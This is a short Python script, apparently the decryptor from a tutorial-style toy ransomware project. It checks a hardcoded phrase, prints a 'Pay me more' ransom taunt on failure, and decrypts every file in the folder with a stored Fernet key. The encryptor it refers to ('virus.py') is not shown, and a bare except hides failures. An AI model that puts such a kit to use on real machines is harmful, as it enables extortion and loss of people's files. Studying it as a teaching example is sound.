#!/usr/bin/env  python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if (file == "virus.py" or file == "encryptedKey.key" or file == "decrypt.py"):
        continue
    if os.path.isfile(file):
        files.append(file)


# Create variable secretePhrase and store the value "hello" or any other
secretPhrase = "hello"

# Ask user to enter the valid phrase to decrypt the files
enteredPhrase = input("Enter valid phrase to decrypt the files\n")

# Check if secretPhrase do not match with the enteredPhrase
if (secretPhrase != enteredPhrase):
    # Print " 👹👹👹👹 Invalid Phrase try one more time or Pay me more 👹👹👹👹 "
    print(" 👹👹👹👹 Invalid Phrase try one more time or Pay me more 👹👹👹👹 ")
# Else:
else:
    # Add try block
    try:
        # Read the encryptedKey.key file and store the content in secretKey variable.
        with open("encryptedKey.key", "rb") as encryptedKey:
            secretKey = encryptedKey.read()

        # Iterate the loop over the files list
        for file in files:
            # Open the file in rb mode and store the content in rawData variable
            with open(file, "rb") as theFile:
                rawData = theFile.read()
            # Use Fernet(secretKey).decrypt(rawData) to decrypt and store the result in decryptRawData variable
            decryptedRawData = Fernet(secretKey).decrypt(rawData)

            # Update the same file with decrypted data
            with open(file, "wb") as theFile:
                theFile.write(decryptedRawData)

        # Notify the message to the user "You have successfully recovered all the files!!"
        print("You have successfully recovered all the files!!")
    # Except pass 
    except:
        pass
